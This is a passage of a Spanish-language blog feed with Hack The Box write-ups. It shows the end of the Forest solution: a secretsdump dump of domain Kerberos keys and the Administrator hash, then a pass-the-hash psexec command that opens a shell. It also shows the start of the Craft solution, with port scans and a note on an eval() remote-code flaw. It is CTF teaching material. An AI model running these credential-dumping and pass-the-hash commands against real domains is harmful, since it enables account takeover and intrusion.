htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:des-cbc-md5:702a3445e0d65b58
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:des-cbc-md5:a2ab5eef017fb9da
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:des-cbc-md5:b5dff1f40b8f3be9
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:d409d743b2d787ba4a45692058388533840bb55a4d1fd65f8e345164d2df5078
FOREST$:aes128-cts-hmac-sha1-96:c7306933e272b5b5992f9c9ff688eaa2
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up... 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.26.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener los hashes de la mayoria de usuarios, podemos obtener el de un solo usuario, en este caso el que nos interesa es el del usuario administrator.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user administrator
Impacket v0.9.21-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
htb.local&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.28.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos psexec.py para obtener nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt; y una shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rlwrap psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-30%2000.43.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/forest/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/forest/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Craft</title>
        <link>https://sckull.github.io/posts/craft/</link>
        <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 04 Jan 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/craft/</guid>
        <description>Craft es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Craft es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Craft&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.110&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/3067&#34;&gt;rotarydrone&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.110 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0               

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-07-30 06:56:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.110
Discovered open port 443/tcp on 10.10.10.110
Discovered open port 6022/tcp on 10.10.10.110
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Tue Jul 30 03:13:35 2019 as: nmap -sV -sC -p 22,443,6022 -o nmap.scan 10.10.10.110&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.110
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
443/tcp  open  ssl/http nginx 1.15.8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.15.8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: About
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;craft.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Craft/stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NY/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;US
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2019-02-06T02:25:47
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2020-06-20T02:25:47
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-nextprotoneg: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
6022/tcp open  ssh      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NULL: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    SSH-2.0-Go
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7/30%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5D3FEE27%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NU
SF:LL,C,&lt;span class=&#34;s2&#34;&gt;&amp;#34;SSH-2\.0-Go\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jul 30 03:14:26 2019 -- 1 IP address (1 host up) scanned in 51.23 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;https&#34;&gt;HTTPS&lt;/h2&gt;
&lt;p&gt;Visitamos la pagina en HTTPS nos muestra un mensaje que nos habla de una rest API.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshotfrom2019-07-3101.12.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;subdominios&#34;&gt;Subdominios&lt;/h4&gt;
&lt;p&gt;Nos movilizamos atravez de las diferentes rutas que nos provee la pagina y encontramos un dominio y dos subdominios, los cuales agregamos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;craft.htb
api.craft.htb
gogs.craft.htb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot_from_2019-07-31_01_14_08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;httpsapicrafthtbapi&#34;&gt;&lt;a href=&#34;https://api.craft.htb/api/&#34;&gt;https://api.craft.htb/api/&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;En la pagina de api nos meustra distintas opciones con las cuales podemos interactuar con una interfaz y tambien nos provee diferentes comandos con curl, para hacer solicitudes a la API.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.20.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;httpsgogscrafthtb&#34;&gt;&lt;a href=&#34;https://gogs.craft.htb/&#34;&gt;https://gogs.craft.htb/&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;En la pagina de gogs nos encontramos con la plataforma gogs que permite el gestionamiento de repositorios, dentro de la misma plataforma nos encontramos con un repositorio.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.21.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;craft-api&#34;&gt;CRAFT API&lt;/h2&gt;
&lt;p&gt;Analizamos el codigo que se encuentra en el repositorio el cual pertenece a la rest API que nos menciona la pagina principal (&lt;code&gt;craft.htb&lt;/code&gt;), contiene toda la estructura de como funciona esta API. Dentro, encontramos que se hizo un cambio a una parte de codigo que pertenece a la creacion de un nuevo &lt;code&gt;brew&lt;/code&gt; de la API.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.30.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dicho cambio incluye una porcion de codigo de python que es vulnerable a ejecucion de comandos remota o RCE.&lt;/p&gt;
&lt;p&gt;Porcion de codigo vulnerable especificamente &lt;code&gt;eval()&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
